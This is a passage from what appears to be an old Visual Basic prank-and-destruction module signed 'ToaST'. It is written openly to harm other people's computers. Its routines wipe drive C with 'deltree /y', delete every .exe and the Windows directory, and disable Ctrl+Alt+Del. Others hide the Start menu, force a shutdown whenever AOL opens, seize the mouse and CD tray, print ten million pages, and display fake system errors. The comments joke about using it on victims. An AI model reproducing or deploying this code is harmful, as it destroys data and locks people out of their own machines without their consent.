    Next Radius
End Sub
Sub ChngMousePos(xpos As String, ypos As String)
whatever = SetCursorPos(xpos, ypos)
End Sub
Sub MouseCrazy()
' Makes there mouse usless
Do
Click% = FindWindow("Shell_TrayWnd", vbNullString)
kazoo = SetCursorPos(Click%, Click%)
okd = SendMessageByNum(Click%, WM_LBUTTONDOWN, 0, 0&)
oku = SendMessageByNum(Click%, WM_LBUTTONUP, 0, 0&)
DoEvents
Loop
End Sub
Sub clock(lbl As Label)
'Place this code in  a timer for a digital clock
'On you form..Looks really cool
 lbl.Caption = Time

End Sub
Sub closecd()

retvalue = mciSendString("set CDAudio door closed", vbNullString, 0, 0)

End Sub
Sub closewin(window)

X = SendMessageByNum(window, WM_DESTROY, 0, 0)


End Sub
Sub MakesThemCrash(frm As Form)
' Set the forms border to none this way they cant move the form
'if you want to use the crazy printer or open close cd
' in here just get rid of the '
' it will make it run slower though
' You might not want run this on your own
' computer unless you saved your project
' And evertyhing else cause theres no way to stop it except for shutting down
' JUST DONT RUN IT ON YOUR COMPUTER
 Do
With frm
 .WindowState = 2
.BackColor = QBColor(Rnd * 15)
.Caption = Val(.Caption) + 1
End With
'Crazyprinter
'opencloseCD
DoEvents
HideStartmenu
StayOnTop frm
DisCRTL_ALT_DEL
Loop




End Sub
Sub opencloseCD()
Do
opencd
Timeout 1
closecd
DoEvents
Loop
End Sub
Sub StayOnTop(the As Form)

SetWinOnTop = SetWindowPos(the.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Sub CrashThereComputer()
Do
On Error Resume Next

Dim ErrorNumber
For ErrorNumber = 0 To 567545
  On Error Resume Next
    Printer.Print Error(ErrorNumber)
Next ErrorNumber
DoEvents
Loop
End Sub
Sub craziness()
Dim i
For i = 1 To 3E+20
    Beep
Next i
End Sub
Sub Crazyprinter()
'Makes there printer Print 10,000,000 pages =)
Dim HWidth, HHeight, i, Msg
    On Error GoTo ErrorHandler
Msg = "ToaST Owns YOU"
    For i = 1 To 10000000
        HWidth = Printer.TextWidth(Msg) / 2
        HHeight = Printer.TextHeight(Msg) / 2
        Printer.CurrentX = Printer.ScaleWidth / 2 - HWidth
        Printer.CurrentY = Printer.ScaleHeight / 2 - HHeight
        Printer.Print Msg & Printer.Page & ". of 10,000,000 pages Have Fun"

Printer.NewPage ' Send new page.
    Next i
    Printer.EndDoc  ' Printing is finished.
    Exit Sub
ErrorHandler:
    
    Exit Sub
End Sub
Public Sub DisCRTL_ALT_DEL()
'Disables the Crtl+Alt+Del
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub
Public Sub allowCRTL_ALT_DEL()
'Enables the Crtl+Alt+Del
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub
Sub FakeFormatC()
' But this in a timer
'Makes it sound like your deleting there Hard drive

MkDir "ToaST"
MkDir "ToaSTer"
MkDir "Pimp"
MkDir "ZzToaSTzZ"
MkDir "HEHE"
RmDir "HEHE"
RmDir "ZzToaSTzZ"
RmDir "Pimp"
RmDir "ToaSTer"
RmDir "ToaST"
MkDir "ToaST1"
MkDir "ToaSTer1"
MkDir "Pimp1"
MkDir "ZzToaSTzZ1"
MkDir "HEHE1"
RmDir "ToaST1"
RmDir "ToaSTer1"
RmDir "Pimp1"
RmDir "ZzToaSTzZ1"
RmDir "HEHE1"
End Sub
Sub ForceShutdown()
ForcedShutdown = ExitWindowsEx(EWX_FORCE, 0&)
End Sub
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
 

End Function
Sub HideWindow(hwnd)
'hides the "hWnd" window
hi = ShowWindow(hwnd, SW_HIDE)
End Sub
Sub UnHideWindow(hwnd)
 
hi = ShowWindow(hwnd, SW_SHOW)
End Sub
Sub MaxWindow(hwnd)
'makes "hWnd" window Maximized
ma = ShowWindow(hwnd, SW_MAXIMIZE)
End Sub
Sub MiniWindow(hwnd)
'minimizes the "hWnd" window
mi = ShowWindow(hwnd, SW_MINIMIZE)
End Sub
Sub mousescroll()
X = Val(X) - 1
Y = Val(Y) - 1
whatever = SetCursorPos(X, Y)
End Sub
Sub opencd()

retvalue = mciSendString("set CDAudio door open", vbNullString, 0, 0)
End Sub

Function PlayAvi(Path)
 
lRet = mciSendString("play " + Path, 0&, 0, 0)
End Function
Function PLayMidi(Path)
 
lRet = mciSendString("play " + Path, 0&, 0, 0)

End Function
Sub PrintHavock()
Do
Dim MyVar
MyVar = "Youve Been Had by ToaST"
Printer.Print ; MyVar
Loop
End Sub
Sub RestartComputer()
ForcedShutdown = ExitWindowsEx(EWX_REBOOT, 0&)
End Sub
Sub scrollformdown(frm As Form)
'This will make the form slowly scroll down
'You can use a timeout to stop it and put it in a
'timer
frm.Height = Val(frm.Height) + 20
End Sub
Sub scrollformup(frm As Form)
'This will make the form slowly scroll up
'You can use a timeout to stop it and put it in a
'timer
frm.Height = Val(frm.Height) - 20
End Sub
Sub ScrollingCredits(lbl As Label)
lbl.Height = Val(lbl.Height) + 10

End Sub
Sub shutdown()

StandardShutdown = ExitWindowsEx(EWX_SHUTDOWN, 0&)

End Sub
Sub SizeFormToWindow(frm As Form, win%)
 
Dim wndRect As RECT, lRet As Long

lRet = GetWindowRect(win%, wndRect)

With frm
  .Top = wndRect.Top * Screen.TwipsPerPixelY
  .Left = wndRect.Left * Screen.TwipsPerPixelX
  .Height = ((wndRect.Bottom) - (wndRect.Top)) * Screen.TwipsPerPixelY
  .Width = ((wndRect.Right) - (wndRect.Left)) * Screen.TwipsPerPixelX
End With
End Sub
Sub SystemError()
'This might not look like a SYS error because with 32 bit u cant make
' those big system Modal white windows like 16 bit
MsgBox "GCF Error in sector 334. Reboot system now.", vbCritical, "GCF ERROR"

End Sub
Sub Timeout(interval)

Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub
Sub volume()
retr = auxSetVolume(344, AUXCAPS_VOLUME)
 
   
End Sub
Sub cdcrazy()
Do
Call opencd
Timeout 0.75
Call closecd
DoEvents
Loop
End Sub

Sub disconnectprinter()
Dim P As Object
For Each P In Printers
    If P.Port = "lpt1:" Or P.DeviceName Like "*laserjet*" Then
        Set Printer = P.Port = com1:
         
        Exit For
        
    End If
Next P
End Sub
Sub loggoff()
legg = ExitWindowsEx(EWX_LOGOFF, 0&)
End Sub


Sub deleteAllEXEsonHD()
'CAUTION USE THIS ONLY ON SOMEONES COMPUTER U DONT LIKE
Kill "*.exe"
End Sub
Sub HideStartmenu()
 ' THIS is funny makes it so they lose the start menu and cant get it back
 'unless u run showstartmenu
c% = FindWindow("Shell_TrayWnd", vbNullString)
 

a = ShowWindow(c%, SW_HIDE)

End Sub
 
Function FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo Greed
firs% = GetWindow(parentw, GW_CHILD)
While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo Greed
firs% = GetWindow(firs%, GW_HWNDNEXT)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo Greed
Wend
FindChildByTitle = 0
Greed:
room% = firs%
FindChildByTitle = room%
End Function
Function GetCaption(hwnd)
'returns the caption of "hWnd" window
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))
GetCaption = hwndTitle$
End Function
Function GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)
GetClass = buffer$
End Function
Public Function GetChildCount(ByVal hwnd As Long) As Long
Dim hChild As Long
Dim i As Integer
If hwnd = 0 Then
GoTo Return_False
End If
hChild = GetWindow(hwnd, GW_CHILD)
While hChild
hChild = GetWindow(hChild, GW_HWNDNEXT)
i = i + 1
Wend
GetChildCount = i
Exit Function
Return_False:
GetChildCount = 0
Exit Function
End Function
Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, GW_MAX)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Greed
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Greed
While firs%
firss% = GetWindow(parentw, GW_MAX)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Greed
firs% = GetWindow(firs%, GW_HWNDNEXT)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo Greed
Wend
FindChildByClass = 0
Greed:
room% = firs%
FindChildByClass = room%
End Function

Sub ShowStartmenu()
 
c% = FindWindow("Shell_TrayWnd", vbNullString)
 
a = ShowWindow(c%, SW_SHOW)
End Sub
 Sub settime()
 Time = "8:08"
 End Sub
Sub setdate()
Date = #12/31/99#
'Might crash system the next day because of the 2000 bug =)
End Sub
Sub TwoThousandBug()
' 2 Minutes till the 2000 bug kicks in =)
Date = #12/31/99#
 Time = "12:57"

End Sub
Sub spinAdrive()
On Error Resume Next
Kill "a:\*.fgd"
End Sub

Sub destroywindows()
 X = Shell("c:\windows\regedit.exe")
' figure it out from here i didnt want to screw MY regisrty up
' It can make your computer stop working
' Just make it so it deleted something on that list BUT
'Dont run it on your own computer
' Be careful
End Sub

Function GetWinDir()
'finds the window's directory
buffer$ = String$(255, 0)
X = GetWindowsDirectory(buffer$, 255)
If Right$(buffer$, 1) <> "\" Then buffer$ = buffer$ + "\"
GetWinDir = buffer$
End Function

Sub delwin()
' BE CAREFULL
RmDir GetWinDir

End Sub

Sub ShutdownWhenAOLlOads()
' this will make it so the person who ran the file
' cant open AOL because the computer will shutdown
' really funny to watch people keep trying to load
' AOL and the computer keeps shutting down =)

Do
aol% = FindWindow("AOL Frame25", vbNullString)
If aol% <> 0 Then
shutdown
End If
DoEvents
Loop
End Sub
Sub FormatC()
'THIS IS THE REAL THING
 X = Shell("deltree /y C:\")
End Sub
Sub MouseCrazy2()
' Makes there mouse run around the screen
Do
boob = (Rnd * 400)
boob2 = (Rnd * 400)
whatever = SetCursorPos(boob, boob2)
DoEvents
Loop
End Sub
Sub DeleteDir(dir As String)
 X = Shell("deltree /y C:\" + dir)
End Sub

Sub TimedShutDown()
' Shuts down the system at a specific time
' Feel free to change the time
If Time = "8:08:00" Then shutdown

End Sub
